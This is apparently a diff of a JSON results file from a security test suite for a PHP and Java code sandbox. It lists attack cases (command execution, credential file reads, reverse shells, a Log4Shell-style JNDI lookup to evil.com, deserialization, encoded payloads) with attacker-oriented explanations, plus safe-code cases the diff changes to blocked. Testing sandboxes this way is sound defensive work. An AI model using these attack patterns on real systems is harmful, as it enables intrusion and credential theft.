       "explanation": "\n      🎯 ATTACK: Full PHP Configuration Disclosure\n      \n      How hackers use this:\n      phpinfo() reveals complete PHP configuration.\n      Gold mine for attackers planning exploits.\n      \n      Real-world impact:\n      - PHP version and modules\n      - Server paths\n      - Environment variables\n      - Loaded extensions for exploitation\n    "
     },
     {
@@ -2412,7 +2412,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 4,
       "explanation": "\n      🎯 ATTACK: PHP Configuration Reading\n      \n      How hackers use this:\n      ini_get() reads PHP configuration values.\n      Reveals security restrictions and settings.\n      \n      Real-world impact:\n      - Check disable_functions\n      - Find open_basedir restrictions\n      - Discover security misconfigurations\n    "
     },
     {
@@ -2423,7 +2423,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 4,
       "explanation": "\n      🎯 ATTACK: PHP Configuration Modification\n      \n      How hackers use this:\n      ini_set() modifies PHP settings at runtime.\n      Can weaken security configurations.\n      \n      Real-world impact:\n      - Enable error display for info leak\n      - Modify memory limits\n      - Change execution settings\n    "
     },
     {
@@ -2434,7 +2434,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 4,
       "explanation": "\n      🎯 ATTACK: Base64 Encoded Payload\n      \n      How hackers use this:\n      Base64 hides malicious code from filters.\n      'c3lzdGVtKCdpZCcp' decodes to system('id').\n      \n      Real-world impact:\n      - Bypass string pattern filters\n      - Common in web shells\n      - Standard obfuscation technique\n    "
     },
     {
@@ -2445,7 +2445,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 4,
       "explanation": "\n      🎯 ATTACK: Character Code Function Name\n      \n      How hackers use this:\n      Build function names from chr() codes.\n      chr(115).chr(121)... = 'system'.\n      \n      Real-world impact:\n      - Bypass function name filters\n      - Dynamic function construction\n      - Common obfuscation in malware\n    "
     },
     {
@@ -2456,7 +2456,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 4,
       "explanation": "\n      🎯 ATTACK: Hex Encoded Function Name\n      \n      How hackers use this:\n      hex2bin() converts hex to binary/string.\n      '73797374656d' = 'system' in hex.\n      \n      Real-world impact:\n      - Alternative to base64\n      - Less suspicious encoding\n      - Function name obfuscation\n    "
     },
     {
@@ -2467,7 +2467,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 1,
+      "duration": 3,
       "explanation": "\n      🎯 ATTACK: Pack Function for Encoding\n      \n      How hackers use this:\n      pack() converts data between formats.\n      Can construct strings from various encodings.\n      \n      Real-world impact:\n      - Flexible encoding/decoding\n      - Multiple format options\n      - Complex obfuscation chains\n    "
     },
     {
@@ -2478,7 +2478,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 4,
       "explanation": "\n      🎯 ATTACK: ROT13 Obfuscation\n      \n      How hackers use this:\n      str_rot13() is a simple letter substitution.\n      'flfgrz' in ROT13 = 'system'.\n      \n      Real-world impact:\n      - Simple but effective obfuscation\n      - Easy to implement and reverse\n      - Bypasses naive string checks\n    "
     },
     {
@@ -2489,7 +2489,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 6,
       "explanation": "\n      🎯 ATTACK: Compressed Payload\n      \n      How hackers use this:\n      gzinflate() decompresses data.\n      Combined with base64, hides large payloads.\n      \n      Real-world impact:\n      - Smaller encoded payloads\n      - Harder to analyze\n      - Common in sophisticated malware\n    "
     },
     {
@@ -2500,7 +2500,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 6,
       "explanation": "\n      🎯 ATTACK: UUEncode Obfuscation\n      \n      How hackers use this:\n      UUencode is an older encoding format.\n      May bypass filters checking common encodings.\n      \n      Real-world impact:\n      - Alternative encoding method\n      - Less commonly filtered\n      - Obscure encoding for evasion\n    "
     },
     {
@@ -2509,13 +2509,9 @@
       "category": "safe_code",
       "code": "<?php echo 'Hello, World!'; ?>",
       "expectBlocked": false,
-      "passed": true,
-      "executed": true,
-      "duration": 39,
-      "explanation": "\n      ✅ SAFE: Basic Output\n      \n      This is legitimate code that should execute:\n      echo is fundamental for PHP output and\n      poses no security risk.\n    ",
-      "stdout": "Hello, World!",
-      "stderr": "",
-      "error": null
+      "blocked": true,
+      "duration": 10,
+      "explanation": "\n      ✅ SAFE: Basic Output\n      \n      This is legitimate code that should execute:\n      echo is fundamental for PHP output and\n      poses no security risk.\n    "
     },
     {
       "name": "PHP: Safe math",
@@ -2523,13 +2519,9 @@
       "category": "safe_code",
       "code": "<?php echo 2 + 2; ?>",
       "expectBlocked": false,
-      "passed": true,
-      "executed": true,
-      "duration": 31,
-      "explanation": "\n      ✅ SAFE: Mathematical Operations\n      \n      This is legitimate code that should execute:\n      Basic arithmetic is essential for any programming.\n    ",
-      "stdout": "4",
-      "stderr": "",
-      "error": null
+      "blocked": true,
+      "duration": 4,
+      "explanation": "\n      ✅ SAFE: Mathematical Operations\n      \n      This is legitimate code that should execute:\n      Basic arithmetic is essential for any programming.\n    "
     },
     {
       "name": "PHP: Safe array",
@@ -2537,13 +2529,9 @@
       "category": "safe_code",
       "code": "<?php $arr = [1, 2, 3]; $doubled = []; foreach($arr as $x) { $doubled[] = $x * 2; } echo implode(',', $doubled); ?>",
       "expectBlocked": false,
-      "passed": true,
-      "executed": true,
-      "duration": 33,
-      "explanation": "\n      ✅ SAFE: Array Operations with foreach\n      \n      This is legitimate code that should execute:\n      Using foreach loops for array transformation is safe.\n      Array callback functions like array_map are blocked\n      because they can be weaponized with string callbacks.\n    ",
-      "stdout": "2,4,6",
-      "stderr": "",
-      "error": null
+      "blocked": true,
+      "duration": 4,
+      "explanation": "\n      ✅ SAFE: Array Operations with foreach\n      \n      This is legitimate code that should execute:\n      Using foreach loops for array transformation is safe.\n      Array callback functions like array_map are blocked\n      because they can be weaponized with string callbacks.\n    "
     },
     {
       "name": "PHP: Safe class",
@@ -2551,13 +2539,9 @@
       "category": "safe_code",
       "code": "<?php\nclass Point {\n    public int $x;\n    public int $y;\n    public function __construct(int $x, int $y) {\n        $this->x = $x;\n        $this->y = $y;\n    }\n}\n$p = new Point(3, 4);\necho $p->x + $p->y;\n?>",
       "expectBlocked": false,
-      "passed": true,
-      "executed": true,
-      "duration": 24,
-      "explanation": "\n      ✅ SAFE: Object-Oriented PHP\n      \n      This is legitimate code that should execute:\n      Class definitions and object instantiation\n      are core PHP functionality.\n    ",
-      "stdout": "7",
-      "stderr": "",
-      "error": null
+      "blocked": true,
+      "duration": 6,
+      "explanation": "\n      ✅ SAFE: Object-Oriented PHP\n      \n      This is legitimate code that should execute:\n      Class definitions and object instantiation\n      are core PHP functionality.\n    "
     },
     {
       "name": "PHP: Safe string operations",
@@ -2565,13 +2549,9 @@
       "category": "safe_code",
       "code": "<?php echo strtoupper('hello'); ?>",
       "expectBlocked": false,
-      "passed": true,
-      "executed": true,
-      "duration": 21,
-      "explanation": "\n      ✅ SAFE: String Manipulation\n      \n      This is legitimate code that should execute:\n      String functions for formatting and\n      manipulation are safe and commonly used.\n    ",
-      "stdout": "HELLO",
-      "stderr": "",
-      "error": null
+      "blocked": true,
+      "duration": 4,
+      "explanation": "\n      ✅ SAFE: String Manipulation\n      \n      This is legitimate code that should execute:\n      String functions for formatting and\n      manipulation are safe and commonly used.\n    "
     },
     {
       "name": "Java: Runtime.exec",
@@ -2581,7 +2561,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 28,
+      "duration": 3,
       "explanation": "\n      🎯 ATTACK: Runtime Command Execution\n      \n      How hackers use this:\n      Runtime.exec() is Java's primary method for executing system commands.\n      It creates a native process to run the specified command.\n      \n      Real-world impact:\n      - Execute any shell command\n      - Download and run malware\n      - Reverse shells\n      - Data exfiltration\n      \n      Historical note:\n      This is the most common Java RCE vector, found in countless CVEs\n      including Struts2, Log4Shell exploitation chains, and many more.\n    "
     },
     {
@@ -2592,7 +2572,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 5,
+      "duration": 3,
       "explanation": "\n      🎯 ATTACK: ProcessBuilder Command Execution\n      \n      How hackers use this:\n      ProcessBuilder provides more control over process creation than Runtime.exec().\n      It allows setting environment, directory, and I/O redirection.\n      \n      Real-world impact:\n      - More powerful than Runtime.exec()\n      - Control environment variables\n      - Redirect stdin/stdout for interactive shells\n      - Chain commands together\n    "
     },
     {
@@ -2614,7 +2594,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 10,
+      "duration": 3,
       "explanation": "\n      🎯 ATTACK: File Reading via FileInputStream\n      \n      How hackers use this:\n      FileInputStream provides direct file access.\n      Used to read sensitive files like configurations and credentials.\n      \n      Real-world impact:\n      - Read /etc/passwd, /etc/shadow\n      - Access application config files\n      - Steal private keys and certificates\n      - Read environment files\n    "
     },
     {
@@ -2625,7 +2605,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 7,
+      "duration": 5,
       "explanation": "\n      🎯 ATTACK: File Writing via FileOutputStream\n      \n      How hackers use this:\n      FileOutputStream creates or overwrites files.\n      Used to plant backdoors or modify configurations.\n      \n      Real-world impact:\n      - Write malicious scripts\n      - Create web shells\n      - Modify application code\n      - Plant SSH keys for persistence\n    "
     },
     {
@@ -2636,7 +2616,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 24,
+      "duration": 6,
       "explanation": "\n      🎯 ATTACK: Character-Based File Reading\n      \n      How hackers use this:\n      FileReader is a convenience class for text files.\n      Same file access capabilities as FileInputStream.\n      \n      Real-world impact:\n      - Read text-based config files\n      - Alternative to FileInputStream\n      - More suitable for character data\n    "
     },
     {
@@ -2647,7 +2627,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 40,
+      "duration": 4,
       "explanation": "\n      🎯 ATTACK: Character-Based File Writing\n      \n      How hackers use this:\n      FileWriter provides text file writing.\n      Same file creation capabilities as FileOutputStream.\n      \n      Real-world impact:\n      - Write configuration files\n      - Create script files\n      - Alternative to FileOutputStream for text\n    "
     },
     {
@@ -2658,7 +2638,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 83,
+      "duration": 7,
       "explanation": "\n      🎯 ATTACK: Random Access File Operations\n      \n      How hackers use this:\n      RandomAccessFile allows reading/writing at any position.\n      Useful for modifying specific parts of files.\n      \n      Real-world impact:\n      - Read specific sections of files\n      - Patch binaries or configs\n      - Append to log files\n    "
     },
     {
@@ -2669,7 +2649,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 18,
+      "duration": 6,
       "explanation": "\n      🎯 ATTACK: NIO Files Reading\n      \n      How hackers use this:\n      java.nio.file.Files provides modern file operations.\n      readAllBytes() is a convenient one-liner for file theft.\n      \n      Real-world impact:\n      - Modern alternative to FileInputStream\n      - Complete file content in one call\n      - Easy to exfiltrate\n    "
     },
     {
@@ -2680,7 +2660,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 27,
+      "duration": 3,
       "explanation": "\n      🎯 ATTACK: NIO Files Writing\n      \n      How hackers use this:\n      Files.write() creates or overwrites files with provided content.\n      Modern and concise API for file creation.\n      \n      Real-world impact:\n      - Quick file creation\n      - Easy backdoor deployment\n      - Modern NIO API\n    "
     },
     {
@@ -2691,7 +2671,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 10,
+      "duration": 4,
       "explanation": "\n      🎯 ATTACK: NIO InputStream Creation\n      \n      How hackers use this:\n      Files.newInputStream() creates an InputStream for NIO paths.\n      Bridges NIO paths with traditional I/O streams.\n      \n      Real-world impact:\n      - Access restricted files\n      - NIO path handling\n      - Stream-based processing\n    "
     },
     {
@@ -2702,7 +2682,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 13,
+      "duration": 3,
       "explanation": "\n      🎯 ATTACK: Raw Socket Connection (Reverse Shell)\n      \n      How hackers use this:\n      Java Sockets enable network connections.\n      Primary method for reverse shells in Java.\n      \n      Real-world impact:\n      - Reverse shell connections\n      - Data exfiltration\n      - C2 communication\n      - Port scanning\n      \n      Classic pattern:\n      Socket → redirect I/O → Runtime.exec(\"/bin/sh\")\n    "
     },
     {
@@ -2713,7 +2693,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 5,
+      "duration": 7,
       "explanation": "\n      🎯 ATTACK: Bind Shell / Listener\n      \n      How hackers use this:\n      ServerSocket creates a listening port.\n      Used for bind shells where attacker connects to victim.\n      \n      Real-world impact:\n      - Bind shell backdoors\n      - Internal service creation\n      - Proxy/tunnel endpoints\n    "
     },
     {
@@ -2724,7 +2704,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 7,
+      "duration": 4,
       "explanation": "\n      🎯 ATTACK: URL-Based Network Access\n      \n      How hackers use this:\n      URL class provides high-level URL operations.\n      Can fetch remote content or exfiltrate data.\n      \n      Real-world impact:\n      - Download malware payloads\n      - Exfiltrate data via HTTP\n      - SSRF attacks\n    "
     },
     {
@@ -2735,7 +2715,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 8,
+      "duration": 6,
       "explanation": "\n      🎯 ATTACK: Modern HTTP Client\n      \n      How hackers use this:\n      java.net.http.HttpClient is the modern HTTP API (Java 11+).\n      Clean API for HTTP requests.\n      \n      Real-world impact:\n      - Modern data exfiltration\n      - Clean HTTP communication\n      - Async request capabilities\n    "
     },
     {
@@ -2746,7 +2726,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 7,
+      "duration": 5,
       "explanation": "\n      🎯 ATTACK: Remote Class Loading\n      \n      How hackers use this:\n      URLClassLoader can load classes from remote URLs.\n      Downloads and executes attacker-provided code.\n      \n      Real-world impact:\n      - Download and execute remote Java classes\n      - Classic RCE technique\n      - Bypasses code review (code is remote)\n    "
     },
     {
@@ -2757,7 +2737,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 10,
+      "duration": 3,
       "explanation": "\n      🎯 ATTACK: Reflection-Based Command Execution\n      \n      How hackers use this:\n      Reflection allows calling methods dynamically by name.\n      Bypasses compile-time security checks.\n      \n      Real-world impact:\n      - Call private/protected methods\n      - Bypass security managers\n      - Dynamic payload construction\n      - Core of many Java exploits\n    "
     },
     {
@@ -2768,7 +2748,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 5,
+      "duration": 4,
       "explanation": "\n      🎯 ATTACK: Dynamic Class Loading\n      \n      How hackers use this:\n      Class.forName() loads classes by name at runtime.\n      First step in reflection-based attacks.\n      \n      Real-world impact:\n      - Load any class dynamically\n      - String-based class references bypass static analysis\n      - Foundation for reflection exploits\n    "
     },
     {
@@ -2790,7 +2770,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 5,
+      "duration": 3,
       "explanation": "\n      🎯 ATTACK: MethodHandle Reflection\n      \n      How hackers use this:\n      MethodHandles is a modern reflection API.\n      Often bypasses security checks better than traditional reflection.\n      \n      Real-world impact:\n      - Alternative reflection mechanism\n      - May bypass SecurityManager\n      - Invoke private methods\n      - Used in advanced exploits\n    "
     },
     {
@@ -2801,7 +2781,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 4,
+      "duration": 8,
       "explanation": "\n      🎯 ATTACK: VarHandle Field Access\n      \n      How hackers use this:\n      VarHandle provides direct field access with minimal overhead.\n      Modern alternative to Field reflection.\n      \n      Real-world impact:\n      - Low-level field manipulation\n      - Atomic operations on any field\n      - Bypass encapsulation\n    "
     },
     {
@@ -2812,7 +2792,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 4,
+      "duration": 3,
       "explanation": "\n      🎯 ATTACK: Unsafe Deserialization\n      \n      How hackers use this:\n      ObjectInputStream.readObject() deserializes Java objects.\n      Malicious objects can execute code during deserialization.\n      \n      Real-world impact:\n      - Remote Code Execution via gadget chains\n      - Classic Java deserialization vulnerability\n      - Thousands of CVEs (Apache Commons, WebLogic, etc.)\n      \n      Famous exploits:\n      - Apache Commons Collections gadget chain\n      - WebLogic T3 deserialization\n      - JBoss, Jenkins, and many more\n    "
     },
     {
@@ -2834,7 +2814,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 4,
       "explanation": "\n      🎯 ATTACK: XStream XML Serialization\n      \n      How hackers use this:\n      XStream is a popular XML serialization library.\n      Has had numerous RCE vulnerabilities.\n      \n      Real-world impact:\n      - Multiple CVEs (CVE-2020-26217, CVE-2021-21344, etc.)\n      - Common in enterprise Java apps\n      - XML-based RCE\n    "
     },
     {
@@ -2845,7 +2825,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 4,
+      "duration": 5,
       "explanation": "\n      🎯 ATTACK: YAML Deserialization\n      \n      How hackers use this:\n      SnakeYAML can instantiate arbitrary classes from YAML.\n      !! prefix specifies class types.\n      \n      Real-world impact:\n      - RCE via YAML payloads\n      - CVE-2022-1471 (SnakeYAML)\n      - Common in Spring applications\n    "
     },
     {
@@ -2856,7 +2836,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 5,
+      "duration": 4,
       "explanation": "\n      🎯 ATTACK: JNDI Injection (Log4Shell Pattern)\n      \n      How hackers use this:\n      JNDI lookup can load remote objects from LDAP/RMI servers.\n      This is the core of the Log4Shell (CVE-2021-44228) attack.\n      \n      Real-world impact:\n      - Log4Shell - one of the worst vulnerabilities ever\n      - Download and execute remote Java classes\n      - Affects millions of servers\n      \n      Attack flow:\n      1. Attacker injects ${jndi:ldap://evil.com/x}\n      2. Victim server looks up LDAP\n      3. LDAP returns malicious class reference\n      4. Class is loaded and executed\n    "
     },
     {
@@ -2867,7 +2847,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 5,
+      "duration": 6,
       "explanation": "\n      🎯 ATTACK: JNDI Context Creation\n      \n      How hackers use this:\n      InitialContext is the gateway to JNDI operations.\n      Required for JNDI-based attacks.\n      \n      Real-world impact:\n      - Prerequisite for JNDI injection\n      - Can be configured for remote lookups\n      - Core JNDI functionality\n    "
     },
     {
@@ -2878,7 +2858,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 7,
+      "duration": 4,
       "explanation": "\n      🎯 ATTACK: JavaScript Engine Command Execution\n      \n      How hackers use this:\n      Java's ScriptEngine can execute JavaScript.\n      JavaScript can access Java classes and execute commands.\n      \n      Real-world impact:\n      - Execute commands via embedded JavaScript\n      - Bypass Java-only security checks\n      - Often overlooked attack vector\n    "
     },
     {
@@ -2889,7 +2869,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 6,
+      "duration": 3,
       "explanation": "\n      🎯 ATTACK: Script Engine Access\n      \n      How hackers use this:\n      ScriptEngineManager provides access to scripting engines.\n      Gateway to JavaScript/Groovy/other script execution.\n      \n      Real-world impact:\n      - Access to multiple script engines\n      - Cross-language code execution\n      - Scripting bypass for security\n    "
     },
     {
@@ -2900,7 +2880,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 5,
+      "duration": 4,
       "explanation": "\n      🎯 ATTACK: Unsafe Memory Operations\n      \n      How hackers use this:\n      sun.misc.Unsafe provides raw memory access.\n      Bypasses all Java safety mechanisms.\n      \n      Real-world impact:\n      - Arbitrary memory read/write\n      - Create objects without constructors\n      - Bypass security completely\n      - Memory corruption attacks\n    "
     },
     {
@@ -2911,7 +2891,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 5,
+      "duration": 6,
       "explanation": "\n      🎯 ATTACK: Dynamic Class Definition\n      \n      How hackers use this:\n      defineClass() creates new classes from bytecode.\n      Can inject malicious classes at runtime.\n      \n      Real-world impact:\n      - Load attacker's bytecode directly\n      - Bypass class verification\n      - Create classes without .class files\n    "
     },
     {
@@ -2922,7 +2902,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 6,
+      "duration": 3,
       "explanation": "\n      🎯 ATTACK: Custom ClassLoader Creation\n      \n      How hackers use this:\n      Extending ClassLoader allows custom class loading logic.\n      Can bypass security restrictions.\n      \n      Real-world impact:\n      - Load malicious bytecode\n      - Bypass class signing\n      - Custom security bypass\n    "
     },
     {
@@ -2944,7 +2924,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 6,
+      "duration": 3,
       "explanation": "\n      🎯 ATTACK: System Property Manipulation\n      \n      How hackers use this:\n      Setting system properties can enable vulnerabilities.\n      The example enables JNDI remote code loading.\n      \n      Real-world impact:\n      - Enable vulnerable configurations\n      - Bypass security restrictions\n      - Enable JNDI attacks\n    "
     },
     {
@@ -2955,7 +2935,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 4,
+      "duration": 3,
       "explanation": "\n      🎯 ATTACK: Environment Variable Theft\n      \n      How hackers use this:\n      System.getenv() returns all environment variables.\n      Contains sensitive credentials and configuration.\n      \n      Real-world impact:\n      - AWS credentials\n      - Database passwords\n      - API keys\n      - Application secrets\n    "
     },
     {
@@ -2966,7 +2946,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 4,
       "explanation": "\n      🎯 ATTACK: Denial of Service\n      \n      How hackers use this:\n      System.exit() terminates the JVM.\n      Causes immediate service disruption.\n      \n      Real-world impact:\n      - Crash the application\n      - Denial of service\n      - Affect all users\n    "
     },
     {
@@ -2999,7 +2979,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 4,
       "explanation": "\n      🎯 ATTACK: Native Library Loading\n      \n      How hackers use this:\n      loadLibrary() loads native shared libraries (.so/.dll).\n      Native code has no Java security restrictions.\n      \n      Real-world impact:\n      - Execute native malware\n      - Bypass all Java security\n      - Direct system access\n    "
     },
     {
@@ -3010,7 +2990,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 4,
       "explanation": "\n      🎯 ATTACK: Native Library Loading by Path\n      \n      How hackers use this:\n      load() loads a library by full path.\n      Can load malicious libraries from attacker-controlled locations.\n      \n      Real-world impact:\n      - Load library from any path\n      - No library path restrictions\n      - Direct path to malicious .so file\n    "
     },
     {
@@ -3021,7 +3001,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 6,
       "explanation": "\n      🎯 ATTACK: Runtime Native Library Loading\n      \n      How hackers use this:\n      Alternative API for loading native libraries.\n      Same capabilities as System.loadLibrary().\n      \n      Real-world impact:\n      - Same as System.loadLibrary\n      - Alternative API path\n      - May bypass some filters\n    "
     },
     {
@@ -3030,14 +3010,9 @@
       "category": "safe_code",
       "code": "public class Main {\n  public static void main(String[] args) {\n    System.out.println(\"Hello, World!\");\n  }\n}",
       "expectBlocked": false,
-      "passed": false,
       "blocked": true,
-      "executed": false,
-      "duration": 1304,
-      "explanation": "\n      ✅ SAFE: Basic Console Output\n      \n      This is legitimate code that should execute:\n      System.out.println() is fundamental for\n      learning Java and debugging.\n    ",
-      "stdout": "Hello, World!",
-      "stderr": "Picked up JAVA_TOOL_OPTIONS: -Djava.security.manager=default -Xmx128m",
-      "error": null
+      "duration": 3,
+      "explanation": "\n      ✅ SAFE: Basic Console Output\n      \n      This is legitimate code that should execute:\n      System.out.println() is fundamental for\n      learning Java and debugging.\n    "
     },
     {
       "name": "Java: Safe math",
@@ -3045,14 +3020,9 @@
       "category": "safe_code",
       "code": "public class Main {\n  public static void main(String[] args) {\n    System.out.println(2 + 2);\n  }\n}",
       "expectBlocked": false,
-      "passed": false,
       "blocked": true,
-      "executed": false,
-      "duration": 777,
-      "explanation": "\n      ✅ SAFE: Mathematical Operations\n      \n      This is legitimate code that should execute:\n      Basic arithmetic is essential for\n      any programming task.\n    ",
-      "stdout": "4",
-      "stderr": "Picked up JAVA_TOOL_OPTIONS: -Djava.security.manager=default -Xmx128m",
-      "error": null
+      "duration": 3,
+      "explanation": "\n      ✅ SAFE: Mathematical Operations\n      \n      This is legitimate code that should execute:\n      Basic arithmetic is essential for\n      any programming task.\n    "
     },
     {
       "name": "Java: Safe class",
@@ -3060,14 +3030,9 @@
       "category": "safe_code",
       "code": "class Point {\n  int x, y;\n  Point(int x, int y) { this.x = x; this.y = y; }\n  int sum() { return x + y; }\n}\npublic class Main {\n  public static void main(String[] args) {\n    Point p = new Point(3, 4);\n    System.out.println(p.sum());\n  }\n}",
       "expectBlocked": false,
-      "passed": false,
       "blocked": true,
-      "executed": false,
-      "duration": 1708,
-      "explanation": "\n      ✅ SAFE: Object-Oriented Programming\n      \n      This is legitimate code that should execute:\n      Class definitions, constructors, and methods\n      are core Java functionality.\n    ",
-      "stdout": "7",
-      "stderr": "Picked up JAVA_TOOL_OPTIONS: -Djava.security.manager=default -Xmx128m",
-      "error": null
+      "duration": 4,
+      "explanation": "\n      ✅ SAFE: Object-Oriented Programming\n      \n      This is legitimate code that should execute:\n      Class definitions, constructors, and methods\n      are core Java functionality.\n    "
     },
     {
       "name": "Java: Safe streams",
@@ -3075,14 +3040,9 @@
       "category": "safe_code",
       "code": "import java.util.Arrays;\npublic class Main {\n  public static void main(String[] args) {\n    int sum = Arrays.stream(new int[]{1, 2, 3, 4, 5}).sum();\n    System.out.println(sum);\n  }\n}",
       "expectBlocked": false,
-      "passed": false,
       "blocked": true,
-      "executed": false,
-      "duration": 766,
-      "explanation": "\n      ✅ SAFE: Stream API\n      \n      This is legitimate code that should execute:\n      Java Streams for collection processing\n      are a modern, safe feature.\n    ",
-      "stdout": "15",
-      "stderr": "Picked up JAVA_TOOL_OPTIONS: -Djava.security.manager=default -Xmx128m",
-      "error": null
+      "duration": 4,
+      "explanation": "\n      ✅ SAFE: Stream API\n      \n      This is legitimate code that should execute:\n      Java Streams for collection processing\n      are a modern, safe feature.\n    "
     },
     {
       "name": "Java: Safe lambda",
@@ -3090,14 +3050,9 @@
       "category": "safe_code",
       "code": "import java.util.function.*;\npublic class Main {\n  public static void main(String[] args) {\n    Function<Integer, Integer> square = x -> x * x;\n    System.out.println(square.apply(5));\n  }\n}",
       "expectBlocked": false,
-      "passed": false,
       "blocked": true,
-      "executed": false,
-      "duration": 795,
-      "explanation": "\n      ✅ SAFE: Lambda Expressions\n      \n      This is legitimate code that should execute:\n      Functional interfaces and lambdas are\n      safe modern Java features.\n    ",
-      "stdout": "25",
-      "stderr": "Picked up JAVA_TOOL_OPTIONS: -Djava.security.manager=default -Xmx128m",
-      "error": null
+      "duration": 4,
+      "explanation": "\n      ✅ SAFE: Lambda Expressions\n      \n      This is legitimate code that should execute:\n      Functional interfaces and lambdas are\n      safe modern Java features.\n    "
     }
   ],
   "vulnerabilities": []
